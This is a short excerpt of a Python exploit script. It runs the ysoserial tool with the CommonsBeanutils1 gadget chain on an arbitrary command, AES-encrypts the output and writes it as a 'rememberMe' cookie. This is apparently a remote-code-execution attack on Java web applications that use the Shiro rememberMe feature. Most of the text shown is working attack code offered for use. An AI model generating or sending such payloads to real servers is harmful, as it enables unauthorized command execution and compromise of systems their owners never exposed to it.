...
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', '/Users/jas502n/Downloads/ysoserial-master/target/ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)
    BS   = AES.block_size
...
if __name__ == '__main__':
    ...
    with open("payload.cookie", "w") as fpw:
        print("Cookie: rememberMe={}".format(payload.decode()), file=fpw)
```
